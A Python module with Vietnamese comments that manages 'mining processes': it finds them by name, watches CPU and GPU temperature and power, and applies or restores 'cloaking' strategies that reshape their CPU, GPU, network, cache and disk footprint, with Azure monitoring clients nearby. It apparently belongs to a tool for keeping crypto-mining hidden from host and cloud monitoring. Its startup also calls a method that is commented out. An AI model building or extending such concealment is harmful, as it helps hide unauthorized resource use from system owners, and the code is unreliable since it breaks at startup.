"""
Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo mô hình đồng bộ (threading).
Đã refactor để loại bỏ toàn bộ asyncio/await, gộp temperature_watcher và power_watcher vào một luồng duy nhất,
và quản lý trạng thái cloaking theo chuỗi:
(normal) -> (cloaking) -> (cloaked) -> (restoring) -> (normal).

Đồng thời, bổ sung hàm collect_metrics, collect_all_metrics ở dạng synchronous.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional, Tuple
from itertools import count

# Các import liên quan đến dự án
from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory
from .resource_control import ResourceControlFactory

# from .azure_clients import (
#     AzureSentinelClient,
#     AzureLogAnalyticsClient,
#     AzureNetworkWatcherClient,
#     AzureAnomalyDetectorClient
# )

# Ở đây, ta sẽ tạm thời bỏ qua các Azure Clients, chỉ giữ lại AzureAnomalyDetectorClient
from .azure_clients import AzureAnomalyDetectorClient


from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


class SharedResourceManager:
    """
    Lớp quản lý tài nguyên chung, ví dụ GPU (NVML), CPU...
    Cung cấp các phương thức hỗ trợ đọc GPU usage, cache usage, v.v.

    Attributes:
        config (ConfigModel): Đối tượng cấu hình
        logger (logging.Logger): Logger cho ghi nhận log
        resource_managers (Dict[str, Any]): Các manager riêng biệt (CPU, GPU...) được tạo từ ResourceControlFactory
        power_manager (PowerManager): Module quản lý power
        strategy_cache (dict): Cache chiến lược cloaking
        _nvml_init (bool): Cờ đánh dấu NVML đã khởi tạo hay chưa
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        """
        Khởi tạo SharedResourceManager.

        :param config: Cấu hình chung (ConfigModel).
        :param logger: Logger để ghi log.
        :param resource_managers: Tập các manager về tài nguyên (CPU/GPU/Network...).
        """
        self.logger = logger
        self.config = config
        self.resource_managers = resource_managers
        self.power_manager = PowerManager()
        self.strategy_cache = {}

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo OK.")
        except Exception as e:
            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        """
        Kiểm tra NVML đã được khởi tạo hay chưa.

        :return: True nếu NVML đã init, False nếu chưa.
        """
        return self._nvml_init

    def initialize_nvml(self):
        """
        Thực hiện khởi tạo NVML (nếu chưa init).
        """
        if not self._nvml_init:
            pynvml.nvmlInit()
            self._nvml_init = True
            self.logger.info("NVML đã được khởi tạo thành công.")

    def shutdown_nvml(self):
        """
        Tắt NVML nếu đang bật.
        """
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.

        :param pid: PID của tiến trình cần đọc cache.
        :return: Phần trăm bộ nhớ cache so với tổng RAM, hoặc 0.0 nếu có lỗi.
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Trả về % GPU usage của tiến trình PID (đồng bộ).

        :param pid: PID của tiến trình.
        :return: Phần trăm GPU usage, 0.0 nếu có lỗi hoặc không tìm thấy GPU.
        """
        try:
            gpu_usage = self._sync_get_gpu_usage_percent(pid)
            self.logger.debug(f"PID={pid} GPU usage: {gpu_usage}%")
            return gpu_usage
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """
        Hàm đồng bộ đọc GPU usage (thông qua NVML).

        :param pid: PID của tiến trình.
        :return: % GPU usage, 0.0 nếu lỗi.
        """
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng chiến lược cloak cho một tiến trình cụ thể.

        :param strategy_name: Tên chiến lược (VD: 'cpu', 'gpu', 'cache'...).
        :param process: Đối tượng MiningProcess.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên (CPU, GPU, Cache, Network...) cho tiến trình đã cloaked.

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            # Duyệt qua các chiến lược được hỗ trợ
            for strategy_name in ['cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory']:
                # Tạo chiến lược tương ứng từ factory
                strategy = CloakStrategyFactory.create_strategy(
                    strategy_name,
                    self.config,
                    self.logger,
                    self.resource_managers
                )
                if not strategy:
                    self.logger.warning(f"Không thể tạo chiến lược {strategy_name} cho PID={pid}.")
                    continue

                try:
                    # Gọi hàm restore trên chiến lược
                    strategy.restore(process)
                    self.logger.info(f"Đã khôi phục tài nguyên '{strategy_name}' cho PID={pid}.")
                    restored = True
                except Exception as e:
                    self.logger.error(f"Lỗi khi khôi phục tài nguyên '{strategy_name}' cho PID={pid}: {e}")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID={pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID={pid}).")
        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}")
            raise

class ResourceManager(IResourceManager):
    """
    Lớp ResourceManager chịu trách nhiệm quản lý tài nguyên CPU, RAM, GPU, Network...
    Thực hiện giám sát qua watchers, xử lý event 'resource_adjustment', áp dụng hoặc khôi phục cloaking.
    Đảm bảo quá trình cloaking tuân theo chuỗi:
        (normal) -> (cloaking) -> (cloaked) -> (restoring) -> (normal).

    Cung cấp hàm collect_metrics, collect_all_metrics (đồng bộ) để lấy metrics cho anomaly_detector hoặc các module khác.
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        """
        Triển khai Singleton pattern.
        """
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        """
        Khởi tạo ResourceManager (đảm bảo singleton).

        :param config: Cấu hình ResourceManager.
        :param event_bus: Cơ chế pub/sub (EventBus).
        :param logger: Logger dùng để ghi log.
        """
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.logger = logger
        self.config = config
        self.event_bus = event_bus

        # Cờ dừng watchers
        self._stop_flag = False

        # Lock đồng bộ
        self.mining_processes_lock = threading.RLock()  # Sử dụng trực tiếp threading.RLock
        self.mining_processes: List[MiningProcess] = []

        # Queue để điều chỉnh tài nguyên
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Danh sách thread
        self.watchers: List[threading.Thread] = []
        self.shared_resource_manager: Optional[SharedResourceManager] = None

        # Bộ đếm cho priority queue (nếu cần)
        self._counter = count()

        # Bản đồ PID -> trạng thái cloaking
        self.process_states: Dict[int, str] = {}

        self.logger.info("ResourceManager.__init__")

        # Đăng ký lắng nghe event 'resource_adjustment'
        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)

    # ---------------- THÊM 2 HÀM COLLECT_METRICS & COLLECT_ALL_METRICS (SYNC) ---------------
    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập metrics của một tiến trình (CPU, GPU, Cache, Network...).
        Chạy đồng bộ, không dùng async/await.

        :param process: Đối tượng MiningProcess.
        :return: dict { 'cpu_usage', 'memory_usage', 'gpu_usage', 'network_usage', 'cache_usage' }
        """
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            # CPU usage
            cpu_pct = proc_obj.cpu_percent(interval=1)
            # RAM MB
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            # GPU usage
            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Network usage => tùy logic, ví dụ disk IO limit
            disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)  # Giả sử hàm sync
            # Cache usage
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid)

            metrics = {
                'cpu_usage': float(cpu_pct),
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        """
        Thu thập metrics cho tất cả mining_processes => { 'pid': {metrics}, ... }.
        Đồng bộ, dùng lock bảo vệ self.mining_processes.
        
        :return: dict, key=pid(str), value=dict metrics
        """
        metrics_data: Dict[str, Dict[str, Any]] = {}
        # Acquire lock
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data

        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics đã thu thập (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data
    # -----------------------------------------------------------------------------------------

    def start(self):
        """
        Khởi động ResourceManager: Tạo resource_managers, khởi tạo SharedResourceManager, watchers...
        """
        self.logger.info("Bắt đầu khởi động ResourceManager...")
        try:
            # Tạo resource managers (CPU, GPU, Network, v.v.) - đồng bộ
            resource_managers = ResourceControlFactory.create_resource_managers(
                config=self.config,
                logger=self.logger
            )
            if not resource_managers:
                raise RuntimeError("ResourceControlFactory trả về rỗng hoặc None.")

            # Khởi tạo shared manager (NVML, GPU usage, v.v.)
            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)

            # Khởi tạo Azure clients, khám phá tài nguyên
            self.initialize_azure_clients()
            self.discover_azure_resources()

            # Tạo thread watchers
            monitor_thread = threading.Thread(
                target=self.monitor_watcher,
                daemon=True,
                name="MonitorWatcher"
            )
            monitor_thread.start()
            self.watchers.append(monitor_thread)

            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="AdjustmentWorker"
            )
            adjust_thread.start()
            self.watchers.append(adjust_thread)

            self.logger.info("ResourceManager đã khởi động thành công.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
            self.shutdown()

    def initialize_azure_clients(self):
        """
        Khởi tạo các Azure Client phục vụ giám sát, logging, anomaly.
        """
        self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
        # self.azure_sentinel_client = AzureSentinelClient(self.logger)
        # self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        # self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
        self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")

    # def discover_azure_resources(self):
    #     """
    #     Khám phá các tài nguyên Azure như Network Watchers, NSGs, v.v.
    #     """
    #     try:
    #         net_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
    #         self.network_watchers = net_watchers
    #         self.logger.info(f"Khám phá {len(net_watchers)} Network Watchers.")

    #         nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
    #         self.nsgs = nsgs
    #         self.logger.info(f"Khám phá {len(nsgs)} NSGs.")

    #         self.logger.info("Khám phá Traffic Analytics Workspaces (nếu có).")
    #     except Exception as e:
    #         self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra GPU (NVML) đã init hay chưa.

        :return: True nếu đã init, ngược lại False.
        """
        if self.shared_resource_manager:
            return self.shared_resource_manager.is_nvml_initialized()
        return False

    def restore_resources(self, process: MiningProcess) -> bool:
        """
        Khôi phục tài nguyên cho một tiến trình (nếu shared_resource_manager tồn tại).

        :param process: Đối tượng MiningProcess.
        :return: True nếu khôi phục thành công, False nếu có lỗi.
        """
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.restore_resources(process)
                return True
            return False
        except Exception as e:
            self.logger.error(f"Lỗi restore_resources PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

    def handle_resource_adjustment(self, task: Dict[str, Any]):
        """
        Nhận event 'resource_adjustment' => đưa vào hàng đợi resource_adjustment_queue.

        :param task: Thông tin nhiệm vụ (loại: cloaking/restoration, process, v.v.).
        """
        try:
            priority = task.get('priority', 1)
            count_val = next(self._counter)
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(
                f"Đã nhận sự kiện: {task['type']} cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
            )
        except Exception as e:
            self.logger.error(f"Lỗi handle_resource_adjustment: {e}\n{traceback.format_exc()}")

    def enqueue_cloaking(self, process: MiningProcess):
        """
        Thêm yêu cầu cloak vào queue (vd: cpu, gpu, cache...).

        :param process: Đối tượng MiningProcess cần cloak.
        """
        try:
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
            }
            priority = 1
            count_val = next(self._counter)
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue cloaking cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    def enqueue_restoration(self, process: MiningProcess):
        """
        Thêm yêu cầu khôi phục tài nguyên vào queue.

        :param process: Đối tượng MiningProcess cần restore.
        """
        try:
            task = {
                'type': 'restoration',
                'process': process
            }
            priority = 2
            count_val = next(self._counter)
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue khôi phục cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restoration PID={process.pid}: {e}\n{traceback.format_exc()}")

    def process_resource_adjustments(self):
        """
        Worker loop chạy trong một thread riêng để xử lý queue resource_adjustment.
        Nếu là cloaking => áp dụng chiến lược => chuyển trạng thái process thành 'cloaked'.
        Nếu là restoration => khôi phục tài nguyên => chuyển trạng thái process thành 'normal'.
        """
        while not self._stop_flag:
            try:
                priority, count_val, task = self.resource_adjustment_queue.get(timeout=1)
                p = task['process']
                pid = p.pid

                if task['type'] == 'cloaking':
                    # Giả sử process_states[pid] đang là 'cloaking'
                    if not self.shared_resource_manager:
                        self.logger.warning("Chưa có shared_resource_manager, bỏ qua cloaking.")
                        continue

                    sr = self.shared_resource_manager
                    for strat in task['strategies']:
                        if strat not in sr.strategy_cache:
                            s = CloakStrategyFactory.create_strategy(
                                strat, self.config, self.logger, sr.resource_managers
                            )
                            sr.strategy_cache[strat] = s
                        else:
                            s = sr.strategy_cache[strat]

                        if s and hasattr(s, 'apply'):
                            s.apply(p)

                    # Cloak xong => set state = 'cloaked'
                    self.process_states[pid] = "cloaked"
                    self.logger.info(f"Process PID={pid} chuyển trạng thái -> cloaked.")

                elif task['type'] == 'restoration':
                    # restore => state='normal'
                    if self.shared_resource_manager:
                        self.process_states[pid] = "restoring"
                        self.shared_resource_manager.restore_resources(p)
                        self.process_states[pid] = "normal"
                        self.logger.info(f"Process PID={pid} đã restore => chuyển trạng thái -> normal.")

                self.resource_adjustment_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi process_resource_adjustments: {e}")

    def monitor_watcher(self):
        """
        Giám sát nhiệt độ và công suất tiêu thụ của hệ thống, gộp hai watcher 
        (temperature & power) trong một vòng lặp duy nhất.
        
        Mỗi chu kỳ thực hiện:
        1) Khám phá các tiến trình khai thác (discover_mining_processes).
        2) Kiểm tra nhiệt độ CPU/GPU -> Nếu vượt ngưỡng, thêm yêu cầu cloaking.
        3) Kiểm tra công suất CPU/GPU -> Nếu vượt ngưỡng, thêm yêu cầu cloaking.

        Chạy định kỳ theo thời gian cấu hình.

        Attributes:
            self.config: Đối tượng cấu hình chứa các ngưỡng nhiệt độ và công suất.
            self.logger: Logger để ghi log trạng thái và lỗi.
            self._stop_flag: Biến cờ dừng vòng lặp khi ResourceManager dừng hoạt động.
        """
        # Lấy tham số chu kỳ kiểm tra từ cấu hình
        mon_params = self.config.monitoring_parameters
        interval = mon_params.get("temperature_monitoring_interval_seconds", 60)

        # Ngưỡng nhiệt độ từ cấu hình
        temp_lims = self.config.temperature_limits
        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)  # Nhiệt độ tối đa CPU (°C)
        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)  # Nhiệt độ tối đa GPU (°C)

        # Ngưỡng công suất từ cấu hình
        power_lims = self.config.power_limits
        per_dev_power = power_lims.get("per_device_power_watts", {})
        cpu_max_pwr = per_dev_power.get("cpu", 100)  # Công suất tối đa CPU (W)
        gpu_max_pwr = per_dev_power.get("gpu", 230)  # Công suất tối đa GPU (W)

        # Vòng lặp giám sát
        while not self._stop_flag:
            try:
                # 1. Khám phá các tiến trình khai thác
                self.logger.debug("Bắt đầu khám phá tiến trình khai thác.")
                self.discover_mining_processes()

                # 2. Kiểm tra nhiệt độ của CPU và GPU
                self.logger.debug("Bắt đầu kiểm tra nhiệt độ.")
                self.check_temperature_all(cpu_max_temp, gpu_max_temp)

                # 3. Kiểm tra công suất tiêu thụ của CPU và GPU
                self.logger.debug("Bắt đầu kiểm tra công suất.")
                self.check_power_all(cpu_max_pwr, gpu_max_pwr)

            except Exception as e:
                # Log lỗi nếu có ngoại lệ
                self.logger.error(f"Lỗi không mong muốn trong monitor_watcher: {e}\n{traceback.format_exc()}")

            # Tạm dừng trước khi lặp lại chu kỳ
            time.sleep(interval)

    def discover_mining_processes(self):
        """
        Tìm tiến trình CPU/GPU => cập nhật self.mining_processes.
        Áp dụng lock để tránh race condition.
        Nếu PID mới được phát hiện => set state = 'normal'.
        """
        try:
            if not self.mining_processes_lock.acquire(timeout=5):
                self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                return

            self.mining_processes.clear()
            cpu_name = self.config.processes.get('CPU', '').lower()
            gpu_name = self.config.processes.get('GPU', '').lower()

            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    pname = proc.info['name'].lower()
                    if cpu_name in pname or gpu_name in pname:
                        prio = self.get_process_priority(proc.info['name'])
                        net_if = self.config.network_interface
                        mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                        self.mining_processes.append(mproc)

                        # Nếu PID lần đầu => state='normal'
                        if mproc.pid not in self.process_states:
                            self.process_states[mproc.pid] = "normal"
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
        finally:
            try:
                self.mining_processes_lock.release()
            except RuntimeError:
                pass

    def get_process_priority(self, process_name: str) -> int:
        """
        Trả về độ ưu tiên của tiến trình dựa trên map cấu hình.

        :param process_name: Tên tiến trình (str).
        :return: Mức ưu tiên (int).
        """
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    def check_temperature_all(self, cpu_max_temp: float, gpu_max_temp: float):
        """
        Kiểm tra nhiệt độ CPU/GPU cho tất cả mining_processes,
        nếu quá ngưỡng thì enqueue cloaking (chỉ khi state='normal').
        """
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.warning("Timeout lock => check_temperature_all.")
            return

        try:
            for mproc in self.mining_processes:
                pid = mproc.pid
                current_state = self.process_states.get(pid, "normal")

                if current_state != "normal":
                    continue

                cpu_temp = temperature_monitor.get_cpu_temperature()  # Giả sử hàm đồng bộ
                if self.is_gpu_initialized():
                    g_temps = temperature_monitor.get_gpu_temperature()  # Giả sử hàm đồng bộ
                else:
                    g_temps = []

                if not isinstance(g_temps, (list, tuple)):
                    g_temps = [g_temps]

                if cpu_temp > cpu_max_temp:
                    self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={pid}).")
                    self.process_states[pid] = "cloaking"
                    self.enqueue_cloaking(mproc)
                    continue

                if any(t > gpu_max_temp for t in g_temps if t):
                    self.logger.warning(f"Nhiệt độ GPU {g_temps}°C > {gpu_max_temp}°C (PID={pid}).")
                    self.process_states[pid] = "cloaking"
                    self.enqueue_cloaking(mproc)
        except Exception as e:
            self.logger.error(f"Lỗi check_temperature_all: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

    def check_power_all(self, cpu_max_power: float, gpu_max_power: float):
        """
        Kiểm tra công suất CPU/GPU cho tất cả mining_processes,
        nếu vượt ngưỡng thì enqueue cloaking (chỉ khi state='normal').
        """
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.warning("Timeout lock => check_power_all.")
            return

        try:
            for mproc in self.mining_processes:
                pid = mproc.pid
                current_state = self.process_states.get(pid, "normal")
                if current_state != "normal":
                    continue

                c_power = get_cpu_power(pid)
                g_power = get_gpu_power(pid)

                if c_power and c_power > cpu_max_power:
                    self.logger.warning(f"CPU={c_power}W > {cpu_max_power}W => cloak (PID={pid}).")
                    self.process_states[pid] = "cloaking"
                    self.enqueue_cloaking(mproc)
                    continue

                if isinstance(g_power, list):
                    total_g = sum(g_power)
                    if total_g > gpu_max_power:
                        self.logger.warning(f"GPU={total_g}W > {gpu_max_power}W => cloak (PID={pid}).")
                        self.process_states[pid] = "cloaking"
                        self.enqueue_cloaking(mproc)
                else:
                    if g_power and g_power > gpu_max_power:
                        self.logger.warning(f"GPU={g_power}W > {gpu_max_power}W => cloak (PID={pid}).")
                        self.process_states[pid] = "cloaking"
                        self.enqueue_cloaking(mproc)
        except Exception as e:
            self.logger.error(f"Lỗi check_power_all: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

    def shutdown(self):
        """
        Dừng ResourceManager: hủy watchers, shutdown NVML, restore resources nếu cần.
        """
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
        self._stop_flag = True

        # Dừng các thread watchers
        for w in self.watchers:
            w.join(timeout=2)

        # Tắt NVML
        if self.shared_resource_manager:
            self.shared_resource_manager.shutdown_nvml()

        # Khôi phục tài nguyên (nếu PID đang cloaked)
        try:
            if self.mining_processes_lock.acquire(timeout=5):
                for proc in self.mining_processes:
                    pid = proc.pid
                    state = self.process_states.get(pid, "normal")
                    if state == "cloaked":
                        self.logger.info(f"Auto-restore PID={pid} trước khi tắt.")
                        self.process_states[pid] = "restoring"
                        if self.shared_resource_manager:
                            self.shared_resource_manager.restore_resources(proc)
                        self.process_states[pid] = "normal"
        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục tài nguyên: {e}")
        finally:
            try:
                self.mining_processes_lock.release()
            except RuntimeError:
                pass
